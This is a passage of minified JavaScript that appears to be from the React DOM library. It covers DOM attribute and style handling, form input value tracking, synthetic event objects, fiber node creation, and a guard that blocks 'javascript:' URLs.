ea(e,t){Aa(e,t),Aa(e+"Capture",t)}function Aa(e,t){for(oo[e]=t,e=0;e<t.length;e++)uo.add(t[e])}var Ch=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),ro={},fo={};function Ah(e){return ga.call(fo,e)?!0:ga.call(ro,e)?!1:Ch.test(e)?fo[e]=!0:(ro[e]=!0,!1)}function yi(e,t,l){if(Ah(t))if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":e.removeAttribute(t);return;case"boolean":var a=t.toLowerCase().slice(0,5);if(a!=="data-"&&a!=="aria-"){e.removeAttribute(t);return}}e.setAttribute(t,""+l)}}function pi(e,t,l){if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttribute(t,""+l)}}function cl(e,t,l,a){if(a===null)e.removeAttribute(l);else{switch(typeof a){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(l);return}e.setAttributeNS(t,l,""+a)}}function kt(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function ho(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Eh(e,t,l){var a=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&typeof a<"u"&&typeof a.get=="function"&&typeof a.set=="function"){var n=a.get,i=a.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return n.call(this)},set:function(c){l=""+c,i.call(this,c)}}),Object.defineProperty(e,t,{enumerable:a.enumerable}),{getValue:function(){return l},setValue:function(c){l=""+c},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Us(e){if(!e._valueTracker){var t=ho(e)?"checked":"value";e._valueTracker=Eh(e,t,""+e[t])}}function mo(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var l=t.getValue(),a="";return e&&(a=ho(e)?e.checked?"true":"false":e.value),e=a,e!==l?(t.setValue(e),!0):!1}function gi(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}var zh=/[\n"\\]/g;function Rt(e){return e.replace(zh,function(t){return"\\"+t.charCodeAt(0).toString(16)+" "})}function Ls(e,t,l,a,n,i,c,u){e.name="",c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"?e.type=c:e.removeAttribute("type"),t!=null?c==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+kt(t)):e.value!==""+kt(t)&&(e.value=""+kt(t)):c!=="submit"&&c!=="reset"||e.removeAttribute("value"),t!=null?Bs(e,c,kt(t)):l!=null?Bs(e,c,kt(l)):a!=null&&e.removeAttribute("value"),n==null&&i!=null&&(e.defaultChecked=!!i),n!=null&&(e.checked=n&&typeof n!="function"&&typeof n!="symbol"),u!=null&&typeof u!="function"&&typeof u!="symbol"&&typeof u!="boolean"?e.name=""+kt(u):e.removeAttribute("name")}function yo(e,t,l,a,n,i,c,u){if(i!=null&&typeof i!="function"&&typeof i!="symbol"&&typeof i!="boolean"&&(e.type=i),t!=null||l!=null){if(!(i!=="submit"&&i!=="reset"||t!=null)){Us(e);return}l=l!=null?""+kt(l):"",t=t!=null?""+kt(t):l,u||t===e.value||(e.value=t),e.defaultValue=t}a=a??n,a=typeof a!="function"&&typeof a!="symbol"&&!!a,e.checked=u?e.checked:!!a,e.defaultChecked=!!a,c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"&&(e.name=c),Us(e)}function Bs(e,t,l){t==="number"&&gi(e.ownerDocument)===e||e.defaultValue===""+l||(e.defaultValue=""+l)}function Ea(e,t,l,a){if(e=e.options,t){t={};for(var n=0;n<l.length;n++)t["$"+l[n]]=!0;for(l=0;l<e.length;l++)n=t.hasOwnProperty("$"+e[l].value),e[l].selected!==n&&(e[l].selected=n),n&&a&&(e[l].defaultSelected=!0)}else{for(l=""+kt(l),t=null,n=0;n<e.length;n++){if(e[n].value===l){e[n].selected=!0,a&&(e[n].defaultSelected=!0);return}t!==null||e[n].disabled||(t=e[n])}t!==null&&(t.selected=!0)}}function po(e,t,l){if(t!=null&&(t=""+kt(t),t!==e.value&&(e.value=t),l==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=l!=null?""+kt(l):""}function go(e,t,l,a){if(t==null){if(a!=null){if(l!=null)throw Error(m(92));if(Ne(a)){if(1<a.length)throw Error(m(93));a=a[0]}l=a}l==null&&(l=""),t=l}l=kt(t),e.defaultValue=l,a=e.textContent,a===l&&a!==""&&a!==null&&(e.value=a),Us(e)}function za(e,t){if(t){var l=e.firstChild;if(l&&l===e.lastChild&&l.nodeType===3){l.nodeValue=t;return}}e.textContent=t}var Oh=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function vo(e,t,l){var a=t.indexOf("--")===0;l==null||typeof l=="boolean"||l===""?a?e.setProperty(t,""):t==="float"?e.cssFloat="":e[t]="":a?e.setProperty(t,l):typeof l!="number"||l===0||Oh.has(t)?t==="float"?e.cssFloat=l:e[t]=(""+l).trim():e[t]=l+"px"}function bo(e,t,l){if(t!=null&&typeof t!="object")throw Error(m(62));if(e=e.style,l!=null){for(var a in l)!l.hasOwnProperty(a)||t!=null&&t.hasOwnProperty(a)||(a.indexOf("--")===0?e.setProperty(a,""):a==="float"?e.cssFloat="":e[a]="");for(var n in t)a=t[n],t.hasOwnProperty(n)&&l[n]!==a&&vo(e,n,a)}else for(var i in t)t.hasOwnProperty(i)&&vo(e,i,t[i])}function Ys(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var wh=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),_h=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function vi(e){return _h.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}function ul(){}var qs=null;function Gs(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var Oa=null,wa=null;function So(e){var t=il(e);if(t&&(e=t.stateNode)){var l=e[fe]||null;e:switch(e=t.stateNode,t.type){case"input":if(Ls(e,l.value,l.defaultValue,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name),t=l.name,l.type==="radio"&&t!=null){for(l=e;l.parentNode;)l=l.parentNode;for(l=l.querySelectorAll('input[name="'+Rt(""+t)+'"][type="radio"]'),t=0;t<l.length;t++){var a=l[t];if(a!==e&&a.form===e.form){var n=a[fe]||null;if(!n)throw Error(m(90));Ls(a,n.value,n.defaultValue,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name)}}for(t=0;t<l.length;t++)a=l[t],a.form===e.form&&mo(a)}break e;case"textarea":po(e,l.value,l.defaultValue);break e;case"select":t=l.value,t!=null&&Ea(e,!!l.multiple,t,!1)}}}var Vs=!1;function xo(e,t,l){if(Vs)return e(t,l);Vs=!0;try{var a=e(t);return a}finally{if(Vs=!1,(Oa!==null||wa!==null)&&(is(),Oa&&(t=Oa,e=wa,wa=Oa=null,So(t),e)))for(t=0;t<e.length;t++)So(e[t])}}function mn(e,t){var l=e.stateNode;if(l===null)return null;var a=l[fe]||null;if(a===null)return null;l=a[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(a=!a.disabled)||(e=e.type,a=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!a;break e;default:e=!1}if(e)return null;if(l&&typeof l!="function")throw Error(m(231,t,typeof l));return l}var ol=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Xs=!1;if(ol)try{var yn={};Object.defineProperty(yn,"passive",{get:function(){Xs=!0}}),window.addEventListener("test",yn,yn),window.removeEventListener("test",yn,yn)}catch{Xs=!1}var Al=null,Qs=null,bi=null;function jo(){if(bi)return bi;var e,t=Qs,l=t.length,a,n="value"in Al?Al.value:Al.textContent,i=n.length;for(e=0;e<l&&t[e]===n[e];e++);var c=l-e;for(a=1;a<=c&&t[l-a]===n[i-a];a++);return bi=n.slice(e,1<a?1-a:void 0)}function Si(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function xi(){return!0}function To(){return!1}function bt(e){function t(l,a,n,i,c){this._reactName=l,this._targetInst=n,this.type=a,this.nativeEvent=i,this.target=c,this.currentTarget=null;for(var u in e)e.hasOwnProperty(u)&&(l=e[u],this[u]=l?l(i):i[u]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?xi:To,this.isPropagationStopped=To,this}return Q(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var l=this.nativeEvent;l&&(l.preventDefault?l.preventDefault():typeof l.returnValue!="unknown"&&(l.returnValue=!1),this.isDefaultPrevented=xi)},stopPropagation:function(){var l=this.nativeEvent;l&&(l.stopPropagation?l.stopPropagation():typeof l.cancelBubble!="unknown"&&(l.cancelBubble=!0),this.isPropagationStopped=xi)},persist:function(){},isPersistent:xi}),t}var ta={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ji=bt(ta),pn=Q({},ta,{view:0,detail:0}),Mh=bt(pn),Zs,Ks,gn,Ti=Q({},pn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Ws,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==gn&&(gn&&e.type==="mousemove"?(Zs=e.screenX-gn.screenX,Ks=e.screenY-gn.screenY):Ks=Zs=0,gn=e),Zs)},movementY:function(e){return"movementY"in e?e.movementY:Ks}}),No=bt(Ti),Dh=Q({},Ti,{dataTransfer:0}),Hh=bt(Dh),kh=Q({},pn,{relatedTarget:0}),Js=bt(kh),Rh=Q({},ta,{animationName:0,elapsedTime:0,pseudoElement:0}),Uh=bt(Rh),Lh=Q({},ta,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),Bh=bt(Lh),Yh=Q({},ta,{data:0}),Co=bt(Yh),qh={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Gh={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Vh={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Xh(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=Vh[e])?!!t[e]:!1}function Ws(){return Xh}var Qh=Q({},pn,{key:function(e){if(e.key){var t=qh[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=Si(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?Gh[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Ws,charCode:function(e){return e.type==="keypress"?Si(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Si(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Zh=bt(Qh),Kh=Q({},Ti,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Ao=bt(Kh),Jh=Q({},pn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Ws}),Wh=bt(Jh),$h=Q({},ta,{propertyName:0,elapsedTime:0,pseudoElement:0}),Fh=bt($h),Ih=Q({},Ti,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Ph=bt(Ih),em=Q({},ta,{newState:0,oldState:0}),tm=bt(em),lm=[9,13,27,32],$s=ol&&"CompositionEvent"in window,vn=null;ol&&"documentMode"in document&&(vn=document.documentMode);var am=ol&&"TextEvent"in window&&!vn,Eo=ol&&(!$s||vn&&8<vn&&11>=vn),zo=" ",Oo=!1;function wo(e,t){switch(e){case"keyup":return lm.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function _o(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var _a=!1;function nm(e,t){switch(e){case"compositionend":return _o(t);case"keypress":return t.which!==32?null:(Oo=!0,zo);case"textInput":return e=t.data,e===zo&&Oo?null:e;default:return null}}function im(e,t){if(_a)return e==="compositionend"||!$s&&wo(e,t)?(e=jo(),bi=Qs=Al=null,_a=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Eo&&t.locale!=="ko"?null:t.data;default:return null}}var sm={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Mo(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!sm[e.type]:t==="textarea"}function Do(e,t,l,a){Oa?wa?wa.push(a):wa=[a]:Oa=a,t=ds(t,"onChange"),0<t.length&&(l=new ji("onChange","change",null,l,a),e.push({event:l,listeners:t}))}var bn=null,Sn=null;function cm(e){pd(e,0)}function Ni(e){var t=sl(e);if(mo(t))return e}function Ho(e,t){if(e==="change")return t}var ko=!1;if(ol){var Fs;if(ol){var Is="oninput"in document;if(!Is){var Ro=document.createElement("div");Ro.setAttribute("oninput","return;"),Is=typeof Ro.oninput=="function"}Fs=Is}else Fs=!1;ko=Fs&&(!document.documentMode||9<document.documentMode)}function Uo(){bn&&(bn.detachEvent("onpropertychange",Lo),Sn=bn=null)}function Lo(e){if(e.propertyName==="value"&&Ni(Sn)){var t=[];Do(t,Sn,e,Gs(e)),xo(cm,t)}}function um(e,t,l){e==="focusin"?(Uo(),bn=t,Sn=l,bn.attachEvent("onpropertychange",Lo)):e==="focusout"&&Uo()}function om(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Ni(Sn)}function rm(e,t){if(e==="click")return Ni(t)}function fm(e,t){if(e==="input"||e==="change")return Ni(t)}function dm(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var Et=typeof Object.is=="function"?Object.is:dm;function xn(e,t){if(Et(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var l=Object.keys(e),a=Object.keys(t);if(l.length!==a.length)return!1;for(a=0;a<l.length;a++){var n=l[a];if(!ga.call(t,n)||!Et(e[n],t[n]))return!1}return!0}function Bo(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Yo(e,t){var l=Bo(e);e=0;for(var a;l;){if(l.nodeType===3){if(a=e+l.textContent.length,e<=t&&a>=t)return{node:l,offset:t-e};e=a}e:{for(;l;){if(l.nextSibling){l=l.nextSibling;break e}l=l.parentNode}l=void 0}l=Bo(l)}}function qo(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?qo(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Go(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=gi(e.document);t instanceof e.HTMLIFrameElement;){try{var l=typeof t.contentWindow.location.href=="string"}catch{l=!1}if(l)e=t.contentWindow;else break;t=gi(e.document)}return t}function Ps(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}var hm=ol&&"documentMode"in document&&11>=document.documentMode,Ma=null,ec=null,jn=null,tc=!1;function Vo(e,t,l){var a=l.window===l?l.document:l.nodeType===9?l:l.ownerDocument;tc||Ma==null||Ma!==gi(a)||(a=Ma,"selectionStart"in a&&Ps(a)?a={start:a.selectionStart,end:a.selectionEnd}:(a=(a.ownerDocument&&a.ownerDocument.defaultView||window).getSelection(),a={anchorNode:a.anchorNode,anchorOffset:a.anchorOffset,focusNode:a.focusNode,focusOffset:a.focusOffset}),jn&&xn(jn,a)||(jn=a,a=ds(ec,"onSelect"),0<a.length&&(t=new ji("onSelect","select",null,t,l),e.push({event:t,listeners:a}),t.target=Ma)))}function la(e,t){var l={};return l[e.toLowerCase()]=t.toLowerCase(),l["Webkit"+e]="webkit"+t,l["Moz"+e]="moz"+t,l}var Da={animationend:la("Animation","AnimationEnd"),animationiteration:la("Animation","AnimationIteration"),animationstart:la("Animation","AnimationStart"),transitionrun:la("Transition","TransitionRun"),transitionstart:la("Transition","TransitionStart"),transitioncancel:la("Transition","TransitionCancel"),transitionend:la("Transition","TransitionEnd")},lc={},Xo={};ol&&(Xo=document.createElement("div").style,"AnimationEvent"in window||(delete Da.animationend.animation,delete Da.animationiteration.animation,delete Da.animationstart.animation),"TransitionEvent"in window||delete Da.transitionend.transition);function aa(e){if(lc[e])return lc[e];if(!Da[e])return e;var t=Da[e],l;for(l in t)if(t.hasOwnProperty(l)&&l in Xo)return lc[e]=t[l];return e}var Qo=aa("animationend"),Zo=aa("animationiteration"),Ko=aa("animationstart"),mm=aa("transitionrun"),ym=aa("transitionstart"),pm=aa("transitioncancel"),Jo=aa("transitionend"),Wo=new Map,ac="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");ac.push("scrollEnd");function Zt(e,t){Wo.set(e,t),ea(t,[e])}var Ci=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var t=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)},Ut=[],Ha=0,nc=0;function Ai(){for(var e=Ha,t=nc=Ha=0;t<e;){var l=Ut[t];Ut[t++]=null;var a=Ut[t];Ut[t++]=null;var n=Ut[t];Ut[t++]=null;var i=Ut[t];if(Ut[t++]=null,a!==null&&n!==null){var c=a.pending;c===null?n.next=n:(n.next=c.next,c.next=n),a.pending=n}i!==0&&$o(l,n,i)}}function Ei(e,t,l,a){Ut[Ha++]=e,Ut[Ha++]=t,Ut[Ha++]=l,Ut[Ha++]=a,nc|=a,e.lanes|=a,e=e.alternate,e!==null&&(e.lanes|=a)}function ic(e,t,l,a){return Ei(e,t,l,a),zi(e)}function na(e,t){return Ei(e,null,null,t),zi(e)}function $o(e,t,l){e.lanes|=l;var a=e.alternate;a!==null&&(a.lanes|=l);for(var n=!1,i=e.return;i!==null;)i.childLanes|=l,a=i.alternate,a!==null&&(a.childLanes|=l),i.tag===22&&(e=i.stateNode,e===null||e._visibility&1||(n=!0)),e=i,i=i.return;return e.tag===3?(i=e.stateNode,n&&t!==null&&(n=31-gt(l),e=i.hiddenUpdates,a=e[n],a===null?e[n]=[t]:a.push(t),t.lane=l|536870912),i):null}function zi(e){if(50<Xn)throw Xn=0,mu=null,Error(m(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var ka={};function gm(e,t,l,a){this.tag=e,this.key=l,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=a,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function zt(e,t,l,a){return new gm(e,t,l,a)}function sc(e){return e=e.prototype,!(!e||!e.isReactComponent)}function rl(e,t){var l=e.alternate;return l===null?(l=zt(e.tag,t,e.key,e.mode),l.elementType=e.elementType,l.type=e.type,l.stateNode=e.stateNode,l.alternate=e,e.alternate=l):(l.pendingProps=t,l.type=e.type,l.flags=0,l.subtreeFlags=0,l.deletions=null),l.flags=e.flags&65011712,l.childLanes=e.childLanes,l.lanes=e.lanes,l.child=e.child,l.memoizedProps=e.memoizedProps,l.memoizedState=e.memoizedState,l.updateQueue=e.updateQueue,t=e.dependencies,l.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},l.sibling=e.sibling,l.index=e.index,l.ref=e.ref,l.refCleanup=e.refCleanup,l}function Fo(e,t){e.flags&=65011714;var l=e.alternate;return l===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=l.childLanes,e.lanes=l.lanes,e.child=l.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=l.memoizedProps,e.memoizedState=l.memoizedState,e.updateQueue=l.updateQueue,e.type=l.type,t=l.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function Oi(e,t,l,a,n,i){var c=0;if(a=e,typeof e=="function")sc(e)&&(c=1);else if(typeof e=="string")c=jy(e,l,U.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(e){case Ke:return e=zt(31,l,t,n),e.elementType=Ke,e.lanes=i,e;case Ve:return ia(l.children,n,i,t);case mt:c=8,n|=24;break;case ve:return e=zt(12,l,t,n|2),e.elementType=ve,e.lanes=i,e;case O:return e=zt(13,l,t,n),e.elementType=O,e.lanes=i,e;case R:return e=zt(19,l,t,n),e.elementType=R,e.lanes=i,e;default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case G:c=10;break e;case st:c=9;break e;case tt:c=11;break e;case D:c=14;break e;case H:c=16,a=null;break e}c=29,l=Error(m(130,e===null?"null":typeof e,"")),a=null}return t=zt(c,l,t,n),t.elementType=e,t.type=a,t.lanes=i,t}function ia(e,t,l,a){return e=zt(7,e,a,t),e.lanes=l,e}function cc(e,t,l){return e=zt(6,e,null,t),e.lanes=l,e}function Io(e){var t=zt(18,null,null,0);return t.stateNode=e,t}function uc(e,t,l){return t=zt(4,e.children!==null?e.children:[],e.key,t),t.lanes=l,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var Po=new WeakMap;function Lt(e,t){if(typeof e=="object"&&e!==null){var l=Po.get(e);return l!==void 0?l:(t={value:e,source:t,stack:ee(t)},Po.set(e,t),t)}return{value:e,source:t,stack:ee(t)}}var Ra=[],Ua=0,wi=null,Tn=0,Bt=[],Yt=0,El=null,Ft=1,It="";function fl(e,t){Ra[Ua++]=Tn,Ra[Ua++]=wi,wi=e,Tn=t}function er(e,t,l){Bt[Yt++]=Ft,Bt[Yt++]=It,Bt[Yt++]=El,El=e;var a=Ft;e=It;var n=32-gt(a)-1;a&=~(1<<n),l+=1;var i=32-gt(t)+n;if(30<i){var c=n-n%5;i=(a&(1<<c)-1).toString(32),a>>=c,n-=c,Ft=1<<32-gt(t)+n|l<<n|a,It=i+e}else Ft=1<<i|l<<n|a,It=e}function oc(e){e.return!==null&&(fl(e,1),er(e,1,0))}function rc(e){for(;e===wi;)wi=Ra[--Ua],Ra[Ua]=null,Tn=Ra[--Ua],Ra[Ua]=null;for(;e===El;)El=Bt[--Yt],Bt[Yt]=null,It=Bt[--Yt],Bt[Yt]=null,Ft=Bt[--Yt],Bt[Yt]=null}function tr(e,t){Bt[Yt++]=Ft,Bt[Yt++]=It,Bt[Yt++]=El,Ft=t.id,It=t.overflow,El=e}var ct=null,ke=null,ge=!1,zl=null,qt=!1,fc=Error(m(519));function Ol(e){var t=Error(m(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw Nn(Lt(t,e)),fc}function lr(e){var 